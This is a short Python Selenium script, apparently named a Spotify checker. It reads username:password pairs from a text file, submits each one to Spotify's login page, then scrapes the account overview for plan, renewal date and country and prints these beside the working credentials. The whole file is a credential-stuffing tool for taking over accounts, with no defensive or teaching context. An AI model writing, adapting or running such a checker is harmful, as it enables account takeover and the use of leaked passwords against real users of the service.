from selenium import webdriver
import time
from bs4 import BeautifulSoup
driver = webdriver.Firefox(executable_path='/Volumes/Data/Downloads/geckodriver/geckodriver')

def check(user, password):
    """check if the combination works"""

    driver.get("https://accounts.spotify.com/en/login")
    user_elem = driver.find_element_by_id("login-username")
    password_elem = driver.find_element_by_id("login-password")
    button_elem = driver.find_element_by_class_name("btn-green")

    user_elem.clear()
    password_elem.clear()

    user_elem.send_keys(user)
    password_elem.send_keys(password)
    button_elem.click()

    time.sleep(2)

    driver.get("https://www.spotify.com/us/account/overview/")
    parse = BeautifulSoup(driver.page_source, 'html.parser')
    for h3 in parse.find_all('h3', {'class': "product-name"}):
        for b in parse.find_all('b', {'class': "recurring-date"}):
            for p in parse.find_all('p', {'id': "card-profile-country"}):
                print('{}:{}:{}:{}:{}'.format(user, password, h3.get_text(), b.get_text(), p.get_text()))

    driver.delete_all_cookies()

with open('/Users/astronyu/Documents/SpotifyChecker/spotify.txt') as s:
    for line in s:
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())
